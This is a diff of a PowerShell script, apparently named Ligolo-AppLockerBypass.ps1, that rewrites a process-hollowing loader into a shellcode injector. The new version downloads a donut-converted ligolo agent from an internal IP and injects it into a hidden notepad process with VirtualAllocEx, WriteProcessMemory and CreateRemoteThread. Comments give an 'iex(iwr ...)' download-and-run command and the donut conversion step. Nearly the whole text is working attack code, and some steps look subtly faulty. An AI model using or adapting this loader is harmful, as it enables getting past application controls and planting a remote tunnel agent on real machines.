@@ -1,29 +1,20 @@
-# Make sure to convert agent.exe of ligolo to shellcode: donut -f 1 -o agent.bin -a 2 -p "-connect your-server:11601 -ignore-cert" -i agent.exe
-# Make sure you are running as x64 bit process before running.
+#1 Make sure to convert agent.exe of ligolo to shellcode: donut -f 1 -o agent.bin -a 2 -p "-connect your-server:11601 -ignore-cert" -i agent.exe
+#2 Make sure you are running as x64 bit process before running.
+#3 Invoke it: iex(iwr http://192.168.45.173:443/Ligolo-AppLockerBypass.ps1 -UseBasicParsing)
+#4 Run before invoke: "taskkill /F /IM:notepad.exe" before trying again.
+#5 Invoke it: iex(iwr http://192.168.45.173:443/Ligolo-AppLockerBypass.ps1 -UseBasicParsing)
 
-
-# Import necessary Windows API functions
+Start-Process notepad.exe -WindowStyle Hidden
+$url = "http://192.168.45.223/agent.bin"
+$shellcode = (Invoke-WebRequest -Uri $url -UseBasicParsing).Content
+$procid = (Get-Process -Name notepad).Id
 Add-Type -TypeDefinition @"
 using System;
 using System.Runtime.InteropServices;
 
-public class WinAPI {
+public class Kernel32 {
     [DllImport("kernel32.dll", SetLastError = true)]
-    public static extern bool CreateProcess(
-        string lpApplicationName,
-        string lpCommandLine,
-        IntPtr lpProcessAttributes,
-        IntPtr lpThreadAttributes,
-        bool bInheritHandles,
-        uint dwCreationFlags,
-        IntPtr lpEnvironment,
-        string lpCurrentDirectory,
-        ref STARTUPINFO lpStartupInfo,
-        out PROCESS_INFORMATION lpProcessInformation
-    );
-
-    [DllImport("ntdll.dll", SetLastError = true)]
-    public static extern uint NtUnmapViewOfSection(IntPtr hProcess, IntPtr lpBaseAddress);
+    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
 
     [DllImport("kernel32.dll", SetLastError = true)]
     public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
@@ -32,100 +23,69 @@ public class WinAPI {
     public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out int lpNumberOfBytesWritten);
 
     [DllImport("kernel32.dll", SetLastError = true)]
-    public static extern uint ResumeThread(IntPtr hThread);
+    public static extern bool VirtualFreeEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint dwFreeType);
+
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
 
     [DllImport("kernel32.dll", SetLastError = true)]
     public static extern bool CloseHandle(IntPtr hObject);
-}
 
-[StructLayout(LayoutKind.Sequential)]
-public struct STARTUPINFO {
-    public uint cb;
-    public string lpReserved;
-    public string lpDesktop;
-    public string lpTitle;
-    public uint dwX;
-    public uint dwY;
-    public uint dwXSize;
-    public uint dwYSize;
-    public uint dwXCountChars;
-    public uint dwYCountChars;
-    public uint dwFillAttribute;
-    public uint dwFlags;
-    public ushort wShowWindow;
-    public ushort cbReserved2;
-    public IntPtr lpReserved2;
-    public IntPtr hStdInput;
-    public IntPtr hStdOutput;
-    public IntPtr hStdError;
-}
-
-[StructLayout(LayoutKind.Sequential)]
-public struct PROCESS_INFORMATION {
-    public IntPtr hProcess;
-    public IntPtr hThread;
-    public uint dwProcessId;
-    public uint dwThreadId;
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool ResumeThread(IntPtr hThread);
 }
 "@ -Language CSharp
 
-# Constants
-$CREATE_SUSPENDED = 0x4
+$PROCESS_ALL_ACCESS = 0x1F0FFF
+$PROCESS_CREATE_THREAD = 0x0002
+$PROCESS_VM_OPERATION = 0x0008
+$PROCESS_VM_WRITE = 0x0020
+$PROCESS_VM_READ = 0x0010
 $MEM_COMMIT = 0x1000
 $MEM_RESERVE = 0x2000
 $PAGE_EXECUTE_READWRITE = 0x40
 
-# Load shellcode from remote
-$url = "http://192.168.45.223/agent.bin" # Change accordingly
-$shellcode = (Invoke-WebRequest -Uri $url -UseBasicParsing).Content
-
-# Initialize structures
-$si = New-Object WinAPI+STARTUPINFO
-$pi = New-Object WinAPI+PROCESS_INFORMATION
-$si.cb = [System.Runtime.InteropServices.Marshal]::SizeOf([WinAPI+STARTUPINFO])
-
-# Start a suspended process
-$targetExe = "C:\Windows\System32\svchost.exe"
-$success = [WinAPI]::CreateProcess($targetExe, $null, [IntPtr]::Zero, [IntPtr]::Zero, $false, $CREATE_SUSPENDED, [IntPtr]::Zero, $null, [ref]$si, [ref]$pi)
-if (-not $success) {
-    Write-Error "Failed to create suspended process."
+# Open the process in suspended mode
+$hProcess = [Kernel32]::OpenProcess($PROCESS_ALL_ACCESS, $false, $procid)
+if ($hProcess -eq [IntPtr]::Zero) {
+    Write-Error "Failed to open process."
     exit
 }
 
-# Unmap the original executable
-$unmapResult = [WinAPI]::NtUnmapViewOfSection($pi.hProcess, [IntPtr]::Zero)
-if ($unmapResult -ne 0) {
-    Write-Error "Failed to unmap the original section."
-    [WinAPI]::CloseHandle($pi.hProcess)
-    [WinAPI]::CloseHandle($pi.hThread)
-    exit
-}
+# Retrieve process information (Get entry point & image base)
+$hThread = (Get-Process -Id $procid).Threads[0].Id
+$procInfo = (Get-WmiObject Win32_Process -Filter "ProcessId = '$procid'").ExecutablePath
 
-# Allocate memory for the shellcode
+# Allocate memory in the target process
 $size = $shellcode.Length
-$addr = [WinAPI]::VirtualAllocEx($pi.hProcess, [IntPtr]::Zero, [uint32]$size, $MEM_COMMIT -bor $MEM_RESERVE, $PAGE_EXECUTE_READWRITE)
+$addr = [Kernel32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, [uint32]$size, $MEM_COMMIT -bor $MEM_RESERVE, $PAGE_EXECUTE_READWRITE)
 if ($addr -eq [IntPtr]::Zero) {
     Write-Error "Failed to allocate memory in the target process."
-    [WinAPI]::CloseHandle($pi.hProcess)
-    [WinAPI]::CloseHandle($pi.hThread)
+    [Kernel32]::CloseHandle($hProcess)
     exit
 }
 
-# Write the shellcode to the target process
+# Write shellcode to the allocated memory
 $out = 0
-$result = [WinAPI]::WriteProcessMemory($pi.hProcess, $addr, $shellcode, [uint32]$size, [ref]$out)
+$result = [Kernel32]::WriteProcessMemory($hProcess, $addr, $shellcode, [uint32]$size, [ref]$out)
 if (-not $result) {
     Write-Error "Failed to write shellcode to the target process."
-    [WinAPI]::CloseHandle($pi.hProcess)
-    [WinAPI]::CloseHandle($pi.hThread)
+    [Kernel32]::CloseHandle($hProcess)
     exit
 }
 
-# Resume the suspended thread
-[WinAPI]::ResumeThread($pi.hThread) | Out-Null
+# Free the memory of the original image (process hollowing)
+$peBaseAddr = [IntPtr]::Zero
+[Kernel32]::VirtualFreeEx($hProcess, $peBaseAddr, 0, 0x8000)
 
-# Cleanup
-[WinAPI]::CloseHandle($pi.hProcess)
-[WinAPI]::CloseHandle($pi.hThread)
+# Resume the process after injection of shellcode
+$thread = [Kernel32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
+if ($thread -eq [IntPtr]::Zero) {
+    Write-Error "Failed to create remote thread in the target process."
+}
+else {
+    [Kernel32]::ResumeThread($thread)
+    Write-Output "Shellcode injected via process hollowing successfully!"
+}
 
-Write-Output "Process hollowing completed successfully!"
+[Kernel32]::CloseHandle($hProcess)
